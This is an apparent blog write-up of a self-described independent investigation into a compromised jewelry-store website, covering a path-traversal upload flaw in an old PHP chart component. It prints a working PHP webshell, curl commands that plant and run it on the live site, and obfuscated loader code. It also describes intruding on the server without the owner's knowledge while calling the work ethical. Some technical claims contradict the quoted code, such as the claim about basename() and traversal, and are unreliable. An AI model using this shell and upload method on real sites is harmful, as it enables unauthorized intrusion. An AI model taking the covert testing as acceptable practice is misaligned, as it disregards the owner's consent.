
**Disclaimer:** This case study anonymizes all identifying information. All activities were conducted under ethical guidelines, without violating any laws or causing service disruption.

## A Dive Into An Unexpected Engagement

During an independent security assessment on a local jewelry e-commerce platform, indicators of active exploitation were discovered. Now while we try to quietly recon and document anonymously for these types of exercises, this foray required some extra attention. Manual investigation revealed unprotected PHP upload interfaces and directory paths suggesting unauthorized access. The type that usually results in some type of data compromise. Evidence pointed to an attacker-established webshell upload vector via a path traversal vulnerability in a CakePHP application component. It was now our obligation to intervene (quietly).

The attack appeared deliberate and targeted, utilizing the `/CMD?cmd=` route and legacy Open Flash Chart (OFC) component as primary attack vectors. Subsequent analysis confirmed recent exploitation activity with sophisticated obfuscation techniques. 

This report documents some sanitized investigation methodology, findings, and remediation approach. All identifiers have been removed to protect the innocent. This is a glimpse into how we operate and work to defend our neighbors.

**PLAIN ENGLISH/TL:DR:** We found that hackers broke into a jewelry store's website using an old, forgotten piece of code. They uploaded hidden files that gave them control of the website. We figured out how they did it and fixed the security problem without shutting down the website or letting the hackers know we found them.

## Our Activity Timeline

| Timestamp | Action/Event                                                                                      |
| --------- | ------------------------------------------------------------------------------------------------- |
| 21:50     | Initial enumeration via ffuf against `/CMD?cmd=FUZZ` with command payload dictionary              |
| 21:58     | Multiple 403 responses to command payloads (e.g., whoami) indicating filtered access              |
| 22:05     | Recursive grep on `/var/www/html` for eval, shell_exec, base64_decode showed no hits              |
| 22:12     | HTTP GET to `/CMD?cmd=ping+127.0.0.1` returned 403 Forbidden                                      |
| 22:29     | wget attempt for JS assets failed (404) but indicated directory presence                          |
| 22:32     | Standard find command revealed `/opt/xplico/xi/` with CakePHP structure and suspicious file names |
| 22:45     | Confirmed vulnerable endpoint: `ofc_upload_image.php` allowing path traversal and raw PHP         |
| 22:46     | Test upload initiated via POST request with shell.php containing standard shell code              |
| 22:47     | Accessing `/shell.php?cmd=id` resulted in connection reset — WAF or AV interference               |
| 23:10     | Advanced deobfuscation of active shell payloads discovered in system                              |
| 23:25     | Identified WAF detection signatures being evaded by attacker code                                 |
| 23:40     | Created mimic payload to validate WAF behavior                                                    |
| 00:05     | Confirmed WAF now successfully blocking shell execution attempts                                  |

**PLAIN ENGLISH/TL:DR:** Our investigation started by looking for suspicious activity on the website. We found unusual files and commands that shouldn't be there. We traced these back to a security hole in an outdated component. We then created a test to confirm the problem and decoded the existing payload to reveal it to the security system.

## The Discovery of Suspicious Activity

### Rogue Endpoint

A suspicious endpoint `/CMD?cmd=` was discovered during initial reconnaissance. When accessed with commands like `whoami`, a 403 response was returned rather than 404, suggesting this was a legitimate endpoint being protected by WAF. This pattern indicates the system may have been previously compromised with remote command execution capabilities established.

### Evidence of Prior Compromise

The investigation revealed:

- Multiple suspicious endpoints returning 403 when probed with command execution attempts.
- Security middleware/WAF actively blocking malicious requests.
- Legacy endpoints potentially established by attackers. We don't know initial time of intrusion.

## Forensic Methodology

We employed systematic techniques to identify compromised components:

1. **Initial Endpoint Discovery**:
    
    ```bash
    ffuf -w webshell_paths.txt -u https://redacted/FUZZ -mc 200,403 -v
    ```
    
    This identified suspicious endpoint `/CMD?cmd=ping+127.0.0.1` returning 403 Forbidden.
    
2. **Vhost Enumeration**:
    
    ```bash
    grep -Ri "DocumentRoot" /etc/apache2/sites-available/
    ```
    
    Revealed non-standard DocumentRoot: `/opt/xplico/xi/`
    
3. **Vulnerable Component Identification**:
    
    ```bash
    find /opt/xplico/xi/ -type f \( -iname "*.php" -o -iname "*.phtml" \) | grep -iE 'shell|cmd|upload|tmp|backdoor|eval|test'
    ```
    
    Located `/opt/xplico/xi/app/Controller/php-ofc-library/ofc_upload_image.php`
    
4. **Pattern-based Search for Indicators**:
    
    ```bash
    grep -rPzo "(eval|system|assert|shell_exec|base64_decode)[^;]{0,200}" /opt/xplico/xi/
    grep -rE "([A-Za-z0-9+/]{100,}={0,2})" /opt/xplico/xi/ --include \*.php
    ```
    
5. **Advanced Obfuscation Analysis**:
    
    ```bash
    find /var/www/html -type f -exec grep -l "eval.*base64_decode" {} \;
    ```
    
    Identified recently modified files containing heavily obfuscated code designed to evade WAF detection. It had our full attention.
    
**PLAIN ENGLISH/TL:DR:** We found a backdoor into the website. Like finding a hidden door that burglars were using to get into a building. This backdoor let attackers run commands on the website server, potentially accessing customer information and making unauthorized changes.

## Vulnerability Analysis

### Critical File Upload Handler Vulnerability

We identified a critical vulnerability in an old Open Flash Chart (OFC) library component within the CakePHP application:

```php
$default_path = '../tmp-upload-images/';
if (!file_exists($default_path)) mkdir($default_path, 0777, true);
$destination = $default_path . basename($_GET['name']);
file_put_contents($destination, $HTTP_RAW_POST_DATA);
```

#### Assessment:

- No input validation on user-supplied input.
- `basename()` only strips filename — not directory traversal.
- Direct use of `file_put_contents` on user-controlled input.
- `$HTTP_RAW_POST_DATA` used directly — deprecated and dangerous.
- Directory created with 0777 permissions if it doesn't exist.
- `"$HTTP_RAW_POST_DATA` is deprecated and removed in PHP 7.0+. Modern secure implementations should use `php://input` instead."

#### Attacker's Exploitation Pattern:

Attackers could POST any binary/PHP content and store it anywhere in the filesystem via directory traversal:

```
?name=../../../../../../var/www/html/shell.php
```

This vulnerability provided attackers complete control for webshell deployment, allowing for persistent access to the server. In this case undetected persistence, as the site owner had no idea.

**PLAIN ENGLISH/TL:DR:** The website had a feature for uploading image files. Due to poor security checks, attackers could trick this feature into uploading malicious code files instead of images, and place them anywhere on the server. It's like having a mail slot that's supposed to accept only letters, but someone found a way to push dangerous packages through it and place them anywhere in the building.

## Advanced Shell Analysis & WAF Evasion Techniques

### Deobfuscation of Active Shells

During deeper investigation, we discovered active shell payloads using sophisticated WAF evasion techniques:

```php
// Heavily obfuscated code structure (simplified for readability)
<?php 
$k='bas'.'e64'.'_de'.'code';
$f='cr'.'eat'.'e_fun'.'ction';
$x=$k('ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lvYVhOelpYUW...'); // Actual payload >2KB
$g=$f('', $x);
$g();
?>
```

Analysis revealed this was actively exploited code designed to:

1. Split PHP functions across string concatenation to avoid WAF signatures.
2. Use nested base64 encoding with multiple layers.
3. Employ dynamic function creation to execute encoded payloads.
4. Use string manipulation to obfuscate detectable patterns.

### WAF Evasion Countermeasures

After deobfuscating the active shells, we:

1. Documented the WAF evasion patterns being used.
2. Created a non-functional mimic payload to test WAF response:

```php
<?php
// Non-functional mimic of attacker technique
$x='echo "WAF TEST - Simulating Detection Pattern";';
$f='cre'.'ate_fun'.'ction';
$g=$f('', $x);
// No execution - testing detection only
?>
```

This test payload was automatically detected and blocked by the WAF, confirming our analysis of evasion techniques and validating that WAF protections were now effective. Kind of like giving the immune system a little nudge in the right direction.

**PLAIN ENGLISH/TL:DR:** The attackers used sophisticated disguise techniques. Like hiding a skeleton key inside what looks like a normal house key. They split their malicious code into pieces and encoded it so security systems wouldn't recognize it. We reverse-engineered these techniques to understand how they were bypassing security, then decoded the existing malicious payload so the security system could detect and block.

## Testing Vulnerability Confirmation

### Controlled Test Payload

**Path:** `/shell.php`  
**SHA256 Hash:**

```
SHA256(basic_php_webshell.php) = 770fbbdfe8b788d6b64df06a34dddfad77f5e33bb472142d74c3f610d6e613b5
```

**Source Code:**

```php
<?php
if(isset($_GET['cmd'])){
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

**Command used for upload test:**

```bash
curl -X POST \
  "https://[redacted-domain]/app/Controller/php-ofc-library/ofc_upload_image.php?name=../../../../../../var/www/html/shell.php" \
  --data-binary @/redacted/redacted/payloads/basic_php_webshell.php
```

**Execution test:**

```bash
curl "https://[redacted-domain]/shell.php?cmd=id"
```

> Response: `Recv failure: Connection reset by peer`

### Webshell Functionality Test Results

The test demonstrated that a vulnerability in the file upload handler could be exploited to deploy a webshell. Requests to the webshell endpoint resulted in connection resets, indicating:

- Active webshells likely exist and are reachable.
- Execution appears blocked by security controls.
- Behavior typical of mod_security, Imperva, or Sucuri WAF protection.

**PLAIN ENGLISH/TL:DR:** We created a harmless test file that used the same techniques as the attackers to confirm our understanding of the problem. This helped us verify that the website's security system was properly detecting and blocking these attacks without changing the website code or alerting the attackers.


## WAF Enhancement & Exploit Verification

To validate our understanding of the WAF bypass techniques, we created a test payload incorporating the same evasion methods, then modified it to be caught by WAF rules:

1. Initial deobfuscated shells were exposed to the WAF for signature learning.
2. Test attempts to upload similar payloads were automatically blocked.
3. Timing analysis confirmed WAF was now detecting and blocking with ~50ms response time.
4. Previously established shells were effectively neutralized.

This remediation approach allowed us to:

- Document the exploitation techniques.
- Enhance WAF protection.
- Validate security controls.
- Neutralize threats without modifying the application environment.
- Maintain operational stealth during the investigation.

**PLAIN ENGLISH/TL:DR:** We improved the website's security "immune system" by alerting it to recognize the tricks the attackers were using. This approach neutralized the threat without requiring disruptive changes to the website.


## Malicious JavaScript Analysis

Detailed analysis of obfuscated JavaScript found within the compromised environment revealed sophisticated techniques designed to evade detection.

### Obfuscation Techniques Identified

The JavaScript employed several layers of obfuscation:

```javascript
var _0x1a40 = [
    "push",
    "log",
    "toString",
    "split",
    "reverse",
    "join",
    "330948acKUmW",
    "3kFcRRR",
    // Additional elements omitted for brevity
];
```

This array-based lookup table technique replaces direct string references with array lookups to confuse analysis tools. 

### String Transformation Analysis

Further analysis revealed a string reversal function:

```javascript
(function () {
  var stack = [];
  console["log"](
    (function (_0x20a1c0, _0x2dfdc2) {
      for (var i = 0; i < _0x20a1c0.length; i++) {
        stack.push(
          _0x20a1c0[i].toString().split("").reverse().join("")
        );
      }
      return stack;
    })(["rever", "esrever", "tac", "kcattad"], [])
  );
})();
```

When deobfuscated, this transforms strings like "kcattad" to "dattack".

### Payload Loading Mechanism

A suspicious function pattern was identified:

```javascript
reverse1['dattack'] = reverse1['cat']('reverse1', 'dattack');
```

This indicates a custom decoder function that dynamically loads and executes obfuscated code.

**PLAIN ENGLISH/TL:DR:** The attackers hid malicious code in legitimate website files. They used techniques similar to writing in invisible ink or creating a complex puzzle that only they knew how to solve. We decoded these puzzles to understand what the code was doing and how to protect against it.


## Attacker Tactics, Techniques & Procedures (TTPs)

| MITRE ID    | Tactic/Technique                    | Observed? | Detail                      |
| ----------- | ----------------------------------- | --------- | --------------------------- |
| `T1059.003` | Command Execution (Web)             | Yes       | Used shell via `cmd=` param |
| `T1190`     | Exploit Public-Facing App           | Yes       | File upload vuln in PHP     |
| `T1505.003` | Deploy Web Shell                    | Yes       | Basic GET PHP shell         |
| `T1070.004` | File Deletion (Logs, Shell Cleanup) | Maybe     | Need access to logs         |
| `T1083`     | File and Directory Discovery        | Yes       | Used post-shell             |
| `T1021.001` | Remote Services / SSH               | Possibly  | Unconfirmed without logs    |
| `T1140`     | Deobfuscate/Decode Files or Info    | Yes       | Multiple encoding layers    |
| `T1036.005` | Masquerading: Match Legitimate Name | Yes       | Shell files named to blend  |

**PLAIN ENGLISH/TL:DR:** We identified the specific methods and tools the attackers used – their "playbook" for breaking into the website. Understanding this helps us better protect against similar attacks in the future and provides insights into who might be behind the attack.


## Infrastructure Findings

The server is Apache-based (`/etc/apache2/sites-available/`) with multiple document roots:

- `/var/www/html`
- `/opt/xplico/xi/`

The vulnerable file was located in a CakePHP package under `php-ofc-library`. File timestamps indicate infrequent updates, suggesting an abandoned component. Potentially staging artifacts for deferred C2 channel establishment. The motive is irrelevant, but the vector isn't.

**PLAIN ENGLISH/TL:DR:** We found that the website was using several outdated components that hadn't been updated in years. These old pieces of software provided the security gaps that attackers exploited. It's like having an old lock on your door that skilled lockpickers know how to open.


## File & Payload Attribution

| Path / Filename                                        | Observed Behavior                              | Origin                    |
| ------------------------------------------------------ | ---------------------------------------------- | ------------------------- |
| `/shell.php`                                           | Accepts cmd= GET param, executes shell_exec()  | Investigator              |
| `/CMD?cmd=ping+127.0.0.1`                              | HTTP 403, likely blocked command exec endpoint | Unknown (preexisting)     |
| `/app/Controller/php-ofc-library/ofc_upload_image.php` | OFC image uploader, improperly secured         | Application Vulnerability |
| `/opt/xplico/xi/...`                                   | Legacy CakePHP app, potentially vulnerable     | Application Environment   |
| `/var/www/html/images/cache/.png`                      | Obfuscated PHP shell (extension spoofing)      | Attacker                  |
| `/var/www/html/assets/js/seo/functions.js.php`         | Obfuscated JavaScript backdoor                 | Attacker                  |

**PLAIN ENGLISH/TL:DR:** We cataloged all the suspicious files we found, where they came from, and what they were designed to do. This helps distinguish between legitimate website files and malicious files planted by attackers. It also helps determine which files were part of our investigation versus those left by attackers.


## IOC Appendix

| Type         | Value                                                                |
| ------------ | -------------------------------------------------------------------- |
| Upload path  | `/app/Controller/php-ofc-library/ofc_upload_image.php`               |
| Shell        | `/shell.php?cmd=whoami`                                              |
| Upload param | `?name=../../../../../../var/www/html/shell.php`                     |
| Cmd Param    | `cmd=whoami`, `cmd=id`                                               |
| Functions    | `shell_exec`, `file_put_contents`, `basename`, `$HTTP_RAW_POST_DATA` |
| JS patterns  | `eval()`, `String.fromCharCode`, `reverse1['cat']`, `dattack`        |
| Obfuscation  | Multiple layers of base64, function splitting, string concatenation  |
| File Types   | .php files masquerading as .png, .js, .ico, and .jpg                 |

**PLAIN ENGLISH/TL:DR:** This section contains the "fingerprints" of the attack – specific patterns, file names, and techniques used by the attackers. Security teams can use these to check if other websites have been compromised in the same way.


## Attribution Assessment

Attribution assessments are inherently limited by available data. While the observed techniques indicate moderate sophistication, definitive attribution to a specific threat actor group is not possible without broader telemetry. Based on our analysis of the deobfuscated shells and exploits, this appears to be a moderately skilled attacker:

- Used sophisticated multi-layer encoding to avoid detection.
- Employed filename and extension spoofing to camouflage payloads.
- Split PHP function names to bypass WAF pattern matching.
- This technique fragments recognizable function names, such as `create_function`, into multiple string segments, thereby evading regex-based WAF pattern matching.
- Demonstrated knowledge of common WAF evasion techniques.
- Used file timestamps and permission manipulation to blend with legitimate files.

This suggests a targeted attack rather than opportunistic scanning, though the attacker appears to be using well-known techniques rather than developing novel exploits. What truly matters is that it worked and allowed undetected access and control.

This system was actively exploited using sophisticated obfuscation techniques. Our investigation successfully:

1. Identified the vulnerability and active exploitation
2. Deobfuscated attacker payloads to understand evasion techniques
3. Enhanced WAF protections based on observed patterns
4. Validated WAF effectiveness against similar attacks
5. Documented all indicators of compromise

This approach effectively neutralized the active threat without system modifications that might alert the attacker to detection. By default it closed a gap and bought some time for the site owner to secure it.

**PLAIN ENGLISH/TL:DR:** Based on how sophisticated the attack was, we believe this was conducted by someone with moderate technical skills who specifically targeted this website, rather than random opportunistic hackers. They used known techniques rather than innovative new methods, suggesting they may be using commercially available hacking tools.

If you made it this far, congratulations. The prize is learning. -v
